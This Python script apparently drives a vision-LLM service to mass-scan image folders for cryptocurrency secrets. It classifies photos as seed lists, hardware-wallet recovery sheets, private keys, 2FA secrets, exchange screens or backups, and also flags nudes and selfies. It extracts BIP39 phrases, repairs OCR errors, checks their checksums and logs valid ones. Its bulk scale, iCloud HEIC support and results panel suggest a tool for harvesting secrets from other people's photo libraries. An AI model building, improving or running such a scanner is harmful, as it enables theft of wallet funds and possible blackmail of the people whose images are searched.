#!/usr/bin/env python3
"""Vision-LLM OCR for seed phrases (Runpod / vLLM, OpenAI-compatible).

The model reads the image and returns either numbered lines or a
``COLUMNS: n`` header plus words in row order.  Parsing never trusts the line
order: numbered lines are sorted, column layouts are converted to column-major,
every token is matched against the BIP39 wordlist, and the checksum decides.

    ocr_vlm.py --image /path/a.jpg
    ocr_vlm.py --dir /path --limit 50 --concurrency 16
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import io
import json
import os
import re
import sys
import itertools
import threading
import time
from pathlib import Path

import requests

def _env(*names: str, default: str = "") -> str:
    for name in names:
        value = os.environ.get(name)
        if value:
            return value
    return default


PODS = [url.strip().rstrip("/") for url in _env("SCAN_VLM_URLS", "VLM_BASE_URL", default="https://zo0dbb24aajxip-8000.proxy.runpod.net/v1").split(",") if url.strip()]
MODEL = _env("SCAN_VLM_MODEL", "VLM_MODEL", default="")
API_KEY = _env("SCAN_VLM_KEY", "VLM_API_KEY", default="")
MAX_SIDE = int(_env("SCAN_VLM_MAX_SIDE", "VLM_MAX_SIDE", default="1600"))
MAX_TOKENS = int(_env("SCAN_VLM_MAX_TOKENS", "VLM_MAX_TOKENS", default="400"))
TIMEOUT = int(_env("SCAN_VLM_TIMEOUT", "VLM_TIMEOUT", default="120"))
PER_POD = int(_env("SCAN_VLM_CONCURRENCY_PER_POD", default="8"))
CONCURRENCY = int(_env("VLM_CONCURRENCY", default=str(max(1, len(PODS) * PER_POD))))
QUALITY = int(_env("SCAN_VLM_JPEG_QUALITY", "VLM_JPEG_QUALITY", default="90"))

WORDLIST = Path(__file__).with_name("data") / "bip39_english.txt"
SIZES = (12, 15, 18, 21, 24)
IMAGE_EXT = {
    ".jpg", ".jpeg", ".png", ".heic", ".heif", ".webp", ".bmp", ".tif", ".tiff",
    ".avif", ".gif", ".psd", ".jp2", ".jpx", ".ico", ".cur",
    # camera raw: decoded through the embedded JPEG preview
    ".dng", ".nef", ".mrw", ".cr2", ".cr3", ".arw", ".orf", ".rw2", ".sr2", ".raf", ".pef", ".srw",
}
RAW_EXT = {".dng", ".nef", ".mrw", ".cr2", ".cr3", ".arw", ".orf", ".rw2", ".sr2", ".raf", ".pef", ".srw"}

PROMPT = """Classify this image and, if it contains seed words, extract them.

First line, exactly: KIND: <one of seed, crypto, ledger, trezor, wallet, recover, safe, secret, privatekey, backup, exchange, screenshot, text, document, receipt, nude, selfie, person, photo, meme, other>
- seed: a 12/15/18/21/24-word seed phrase list (written or printed)
- crypto: a wallet / exchange / seed-phrase screen that fits none of the below
- ledger: Ledger device, Ledger Live, or a Ledger recovery sheet
- trezor: Trezor device, Trezor Suite, or a Trezor recovery card
- wallet: other software or hardware wallet (MetaMask, Trust, Exodus, Phantom, Coinbase Wallet…)
- recover: a "recover / restore your wallet" screen or a recovery phrase entry
- safe: Safe (Gnosis Safe) multisig app or screen
- secret: a secret key, API secret, 2FA secret or mnemonic written as "secret"
- privatekey: a private key (hex/WIF) or a QR code of one
- backup: a backup file/screen (iCloud or Google backup, keystore .json, wallet backup)
- exchange: an exchange app (Binance, Coinbase, Kraken, Bybit…)
- screenshot: a phone or computer screen
- text: a document or page of readable text
- document: paper, PDF, letter, form
- receipt: receipt, invoice, ticket
- nude: nudity or explicit image
- selfie: close-up face photo
- person: people in the picture
- photo: ordinary photo of anything else
- meme: meme / screenshot with caption
- other: none of the above

Then, only if there are seed words:
- If the words are numbered: output one line per word as '<number> <word>'.
- If they are NOT numbered: output 'COLUMNS: <n>' on the first line (how many
  vertical word columns you see), then every word in row order
  (left-to-right, top-to-bottom).
Output only that — no commentary."""

_WORDS: list[str] | None = None
_INDEX: dict[str, int] | None = None
_LOCAL = threading.local()
_MODEL_LOCK = threading.Lock()
_MODEL_IDS: dict[str, str] = {}
_POD_COUNTER = itertools.count()
# A 40 MP HEIC expands to ~160 MB of RGB while it is being decoded.  With one
# decode per worker that is ~18 GB of transient memory at 112 workers, which is
# what pushed the box into swap and OOM territory.  Only N images are ever
# decoded at once; the upload itself stays fully concurrent.
_DECODE_SLOTS = threading.BoundedSemaphore(int(_env("SCAN_VLM_DECODE_SLOTS", default="20")))


def words() -> list[str]:
    global _WORDS, _INDEX
    if _WORDS is None:
        _WORDS = [w.strip() for w in WORDLIST.read_text().splitlines() if w.strip()]
        _INDEX = {w: i for i, w in enumerate(_WORDS)}
    return _WORDS


def index() -> dict[str, int]:
    words()
    return _INDEX  # type: ignore[return-value]


def session() -> requests.Session:
    if not hasattr(_LOCAL, "session"):
        s = requests.Session()
        s.headers.update({"content-type": "application/json"})
        if API_KEY:
            s.headers["Authorization"] = f"Bearer {API_KEY}"
        _LOCAL.session = s
    return _LOCAL.session


def pod() -> str:
    """Round-robin over SCAN_VLM_URLS so every pod gets an even share."""
    return PODS[next(_POD_COUNTER) % len(PODS)]


def model_for(url: str) -> str:
    """Each pod may call its model differently ('ocr' vs 'Qwen/...')."""
    known = _MODEL_IDS.get(url)
    if known:
        return known
    with _MODEL_LOCK:
        known = _MODEL_IDS.get(url)
        if known:
            return known
        resolved = MODEL if MODEL and "/" in MODEL else ""
        try:
            response = session().get(f"{url}/models", timeout=20)
            ids = [item["id"] for item in response.json().get("data", []) if item.get("id")]
            if ids:
                resolved = ids[0]
        except Exception:
            pass
        _MODEL_IDS[url] = resolved or "ocr"
        return _MODEL_IDS[url]


def describe_pods() -> list[tuple[str, str]]:
    return [(url, model_for(url)) for url in PODS]


# ------------------------------------------------------------------ matching

SUBS = str.maketrans({"0": "o", "1": "l", "5": "s", "8": "b"})


def levenshtein(a: str, b: str) -> int:
    if a == b:
        return 0
    if len(a) < len(b):
        a, b = b, a
    previous = list(range(len(b) + 1))
    for i, ca in enumerate(a, 1):
        current = [i]
        for j, cb in enumerate(b, 1):
            current.append(min(previous[j] + 1, current[j - 1] + 1, previous[j - 1] + (ca != cb)))
        previous = current
    return previous[-1]


def match_word(token: str) -> tuple[str, float] | None:
    token = re.sub(r"[^a-z]", "", token.lower())
    if not token:
        return None
    table = index()
    if token in table:
        return token, 1.0
    swapped = token.translate(SUBS)
    if swapped in table:
        return swapped, 0.92
    if len(token) < 5:
        return None
    limit = 2 if len(token) >= 8 else 1
    best: tuple[str, int] | None = None
    for word in words():
        if abs(len(word) - len(token)) > limit:
            continue
        distance = levenshtein(token, word)
        if distance <= limit and (best is None or distance < best[1]):
            best = (word, distance)
            if distance == 1:
                break
    if best is None:
        return None
    return best[0], (0.85 if best[1] == 1 else 0.8)


# ------------------------------------------------------------------ checksum


def checksum_ok(phrase: list[str]) -> bool:
    if len(phrase) not in SIZES:
        return False
    table = index()
    try:
        indices = [table[word] for word in phrase]
    except KeyError:
        return False
    bits = "".join(f"{value:011b}" for value in indices)
    cs_len = len(phrase) // 3
    ent_len = len(bits) - cs_len
    entropy = int(bits[:ent_len], 2).to_bytes(ent_len // 8, "big")
    digest = hashlib.sha256(entropy).digest()
    expected = "".join(f"{byte:08b}" for byte in digest)[:cs_len]
    return expected == bits[ent_len:]


# ------------------------------------------------------------------ parsing


def column_major(row_major: list[str], columns: int) -> list[str]:
    """Re-read a row-order list down its columns.

    The model returns words left-to-right / top-to-bottom.  A seed card is
    written down column 1, then column 2, and the last column may be short,
    so the grid has to be rebuilt before the columns can be read.
    """
    total = len(row_major)
    if columns < 2 or total == 0:
        return row_major
    rows = -(-total // columns)
    tall = total - columns * (rows - 1)
    if tall <= 0:
        tall = columns
    heights = [rows] * tall + [rows - 1] * (columns - tall)
    grid: list[list[str | None]] = []
    position = 0
    for row_number in range(rows):
        row: list[str | None] = []
        for column in range(columns):
            if row_number < heights[column] and position < total:
                row.append(row_major[position])
                position += 1
            else:
                row.append(None)
        grid.append(row)
    out: list[str] = []
    for column in range(columns):
        for row_number in range(heights[column]):
            word = grid[row_number][column]
            if word is not None:
                out.append(word)
    return out


NUM_RE = re.compile(r"^\s*(\d{1,3})\s*[.):\-]?\s+([A-Za-z]+)\s*$")
COL_RE = re.compile(r"^\s*columns?\s*[:=]\s*(\d{1,2})", re.IGNORECASE)


def longest_run(tokens: list[str]) -> int:
    best = run = 0
    for token in tokens:
        if match_word(token):
            run += 1
            best = max(best, run)
        else:
            run = 0
    return best


def build_candidate(order: str, raw: list[str]) -> dict | None:
    matched = [match_word(token) for token in raw]
    words_out = [pair[0] if pair else token.lower() for token, pair in zip(raw, matched)]
    scores = [pair[1] if pair else 0.0 for pair in matched]
    valid = all(pair is not None for pair in matched) and len(words_out) in SIZES
    ok = valid and checksum_ok(words_out)
    return {
        "words": words_out,
        "scores": scores,
        "checksum": bool(ok),
        "order": order,
    }


KINDS = {
    "seed", "crypto", "ledger", "trezor", "wallet", "recover", "safe",
    "secret", "privatekey", "backup", "exchange", "screenshot", "text",
    "document", "receipt", "nude", "selfie", "person", "photo", "meme", "other",
}
KIND_RE = re.compile(r"^\s*kind\s*[:=]\s*([a-z\-]+)", re.IGNORECASE)


def parse_kind(lines: list[str]) -> tuple[str, list[str]]:
    for position, line in enumerate(lines):
        found = KIND_RE.match(line)
        if found:
            value = found.group(1).lower()
            if value in KINDS:
                return value, lines[:position] + lines[position + 1 :]
            return "other", lines[:position] + lines[position + 1 :]
    return "", lines


def parse_output(text: str) -> dict:
    lines = [line.strip() for line in (text or "").splitlines() if line.strip()]
    model_kind, lines = parse_kind(lines)
    columns = None
    for line in lines[:3]:
        found = COL_RE.match(line)
        if found:
            columns = int(found.group(1))
            break
    numbered: list[tuple[int, str]] = []
    for line in lines:
        found = NUM_RE.match(line)
        if found:
            numbered.append((int(found.group(1)), found.group(2)))
    numbers = sorted(number for number, _ in numbered)
    contiguous = len(numbered) >= 2 and numbers == list(range(1, len(numbered) + 1))

    if contiguous:
        raw = [word for _, word in sorted(numbered)]
        base = build_candidate("numbered", raw)
        candidates = [base] if base else []
        if base and not base["checksum"]:
            for count in range(2, 7):
                candidates.append(build_candidate(f"columns-{count}", column_major(raw, count)))
    else:
        raw = []
        for line in lines:
            if COL_RE.match(line):
                continue
            found = NUM_RE.match(line)
            if found:
                raw.append(found.group(2))
                continue
            raw.extend(token for token in re.split(r"[^A-Za-z]+", line) if token)
        base = build_candidate("columns" if columns else "row", raw)
        candidates = [base] if base else []
        if columns:
            candidates.append(build_candidate(f"columns-{columns}", column_major(raw, columns)))
        for count in range(2, 7):
            if columns and count == columns:
                continue
            candidates.append(build_candidate(f"columns-{count}", column_major(raw, count)))

    good = [candidate for candidate in candidates if candidate and candidate["checksum"]]
    chosen = good[0] if good else (candidates[0] if candidates else None)
    # Never return a 34- or 66-word "phrase": prose produces long runs.  When
    # nothing validates, keep the best-scoring window of a real seed length.
    if chosen and chosen["words"] and len(chosen["words"]) not in SIZES and len(chosen["words"]) > 24:
        best_window = None
        best_score = -1.0
        for size in (24, 21, 18, 15, 12):
            for start in range(0, len(chosen["words"]) - size + 1):
                window = chosen["words"][start : start + size]
                scores = chosen["scores"][start : start + size]
                score = sum(scores) / len(scores)
                if score > best_score:
                    best_score = score
                    best_window = {
                        "words": window,
                        "scores": scores,
                        "checksum": False,
                        "order": f"{chosen['order']}-window{size}",
                    }
        if best_window:
            chosen = best_window
    if not chosen:
        return {
            "phrase": "",
            "words": [],
            "count": 0,
            "checksum": False,
            "confidence": 0.0,
            "order": "none",
            "reason": "no BIP39 words",
            "modelKind": model_kind,
        }
    phrase = chosen["words"]
    confidence = round(sum(chosen["scores"]) / len(chosen["scores"]), 3) if chosen["scores"] else 0.0
    if chosen["checksum"]:
        reason = ""
    elif len(phrase) not in SIZES:
        reason = f"too few words ({len(phrase)})"
    else:
        reason = "checksum fail"
    return {
        "phrase": " ".join(phrase),
        "words": phrase,
        "count": len(phrase),
        "checksum": bool(chosen["checksum"]),
        "confidence": confidence,
        "order": chosen["order"],
        "reason": reason,
        "modelKind": model_kind,
    }


# ------------------------------------------------------------------ transport


def raw_preview(path: Path) -> bytes | None:
    """Largest embedded JPEG inside a camera RAW file.

    Pillow cannot open NEF/MRW/CR2/DNG, but every one of them carries a
    full-size JPEG preview, which is exactly what OCR needs.
    """
    try:
        data = path.read_bytes()
    except OSError:
        return None
    best: bytes | None = None
    position = 0
    while True:
        start = data.find(b"\xff\xd8\xff", position)
        if start < 0:
            break
        end = data.find(b"\xff\xd9", start)
        if end < 0:
            break
        chunk = data[start : end + 2]
        if best is None or len(chunk) > len(best):
            best = chunk
        position = end + 2
    return best


def raw_array(path: Path):
    """Camera raw that has no usable JPEG preview (Minolta MRW, some DNG)."""
    try:
        import rawpy
    except Exception:
        return None
    try:
        with rawpy.imread(str(path)) as raw:
            return raw.postprocess(half_size=True, use_camera_wb=True)
    except Exception:
        return None


def prepare_image(path: Path, max_side: int) -> bytes:
    from PIL import Image, ImageFile, ImageOps

    try:  # HEIC/HEIF from iCloud
        import pillow_heif

        pillow_heif.register_heif_opener()
    except Exception:
        pass

    # Interrupted downloads and camera files often lose their last bytes; the
    # pixels that are there are still worth reading.
    ImageFile.LOAD_TRUNCATED_IMAGES = True
    Image.MAX_IMAGE_PIXELS = 500_000_000

    source = path
    if path.suffix.lower() in RAW_EXT:
        preview = raw_preview(path)
        if preview:
            source = io.BytesIO(preview)
        else:
            array = raw_array(path)
            if array is not None:
                with _DECODE_SLOTS:
                    decoded = Image.fromarray(array).convert("RGB")
                    decoded.thumbnail((max_side, max_side))
                    buffer = io.BytesIO()
                    decoded.save(buffer, "JPEG", quality=QUALITY)
                    return buffer.getvalue()

    with _DECODE_SLOTS, Image.open(source) as image:
        if image.format in ("JPEG", "MPO"):
            # Decode at the scale we need: a 40 MP DSLR JPEG shrinks to
            # 1/4-1/8 of the pixels instead of being decoded in full.
            image.draft("RGB", (max_side, max_side))
        upright = ImageOps.exif_transpose(image)
        if upright is not None:
            image = upright
        image = image.convert("RGB")
        image.thumbnail((max_side, max_side))
        buffer = io.BytesIO()
        image.save(buffer, "JPEG", quality=QUALITY)
        return buffer.getvalue()


def _post(payload: dict) -> str:
    url = pod()
    body = dict(payload)
    body["model"] = model_for(url)
    response = session().post(f"{url}/chat/completions", json=body, timeout=TIMEOUT)
    response.raise_for_status()
    data = response.json()
    return data["choices"][0]["message"]["content"]


def ask(path: Path, max_side: int) -> tuple[str, dict]:
    raw = prepare_image(path, max_side)
    payload = {
        "temperature": 0,
        "max_tokens": MAX_TOKENS,
        "messages": [
            {
                "role": "user",
                "content": [
                    {"type": "text", "text": PROMPT},
                    {
                        "type": "image_url",
                        "image_url": {"url": "data:image/jpeg;base64," + base64.b64encode(raw).decode()},
                    },
                ],
            }
        ],
    }
    last: Exception | None = None
    for attempt in range(3):
        try:
            return _post(payload), payload
        except Exception as error:  # noqa: BLE001
            last = error
            if attempt < 2:
                time.sleep(1 if attempt == 0 else 4)
    raise RuntimeError(f"vlm request failed: {type(last).__name__}: {last}")


def classify(text: str, result: dict) -> dict:
    """Panel labels for one read: what the image is, and whether it holds a
    usable seed phrase.  Shared by the live scan and the offline re-parse so
    an old result is re-labelled exactly like a new one."""
    stripped = (text or "").strip()
    matched = [token for token in re.split(r"[^A-Za-z]+", stripped) if match_word(token)]
    model_kind = result.get("modelKind") or ""
    if result["checksum"]:
        kind = "seed"
    elif result["count"] >= 8 and model_kind == "seed":
        kind = "seed-candidate"
    elif model_kind and model_kind != "seed":
        kind = model_kind
    elif result["count"] >= 8:
        kind = "seed-candidate"
    elif len(stripped) >= 20:
        kind = "text"
    else:
        kind = "photo"
    return {
        "kind": kind,
        "hasText": len(stripped) >= 20,
        "bip39Words": len(matched),
    }


def extract(path: Path, max_side: int | None = None) -> dict:
    """Read one image.  ``max_side`` forces a single read at that size (used
    when re-checking an image whose first read was inconclusive)."""
    started = time.time()
    text, _ = ask(path, max_side or MAX_SIDE)
    result = parse_output(text)
    # Retry at higher resolution only when the first read produced a real word
    # run: either too short to be a seed, or long enough but with no BIP39
    # match (a misordered 3-column layout).  A plain photo yields no word run,
    # and re-reading it at 2400 px costs ~6x the pixels for nothing.
    tentative = [token for token in re.split(r"[^A-Za-z]+", text) if token]
    run = longest_run(tentative)
    retried = False
    if max_side is None and run >= 6 and (result["count"] < 12 or not result["checksum"]):
        try:
            text2, _ = ask(path, 2400)
            second = parse_output(text2)
            retried = True
            if (second["checksum"], second["count"]) >= (result["checksum"], result["count"]):
                text, result = text2, second
        except Exception:
            pass
    result.update(classify(text, result))
    result["pod"] = pod()
    result["raw"] = text
    result["retried"] = retried
    result["seconds"] = round(time.time() - started, 2)
    result["image"] = str(path)
    return result


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--image")
    parser.add_argument("--dir")
    parser.add_argument("--limit", type=int, default=0)
    parser.add_argument("--concurrency", type=int, default=CONCURRENCY)
    parser.add_argument("--out", help="JSONL output path")
    parser.add_argument("--quiet", action="store_true")
    args = parser.parse_args()

    paths: list[Path] = []
    if args.image:
        paths = [Path(args.image)]
    elif args.dir:
        root = Path(args.dir)
        for path in sorted(root.rglob("*")):
            if path.is_file() and path.suffix.lower() in IMAGE_EXT:
                paths.append(path)
                if args.limit and len(paths) >= args.limit:
                    break
    if not paths:
        raise SystemExit("nothing to do: give --image or --dir")

    from concurrent.futures import ThreadPoolExecutor

    results: list[dict] = []
    with ThreadPoolExecutor(max_workers=max(1, args.concurrency)) as pool:
        for result in pool.map(extract, paths):
            results.append(result)
            if not args.quiet:
                print(json.dumps(result, ensure_ascii=False))
    if args.out:
        with open(args.out, "w") as handle:
            for result in results:
                handle.write(json.dumps(result, ensure_ascii=False) + "\n")
    if not args.quiet:
        valid = sum(1 for r in results if r["checksum"])
        print(f"\n{len(results)} images, checksum-valid {valid}", file=sys.stderr)


if __name__ == "__main__":
    main()
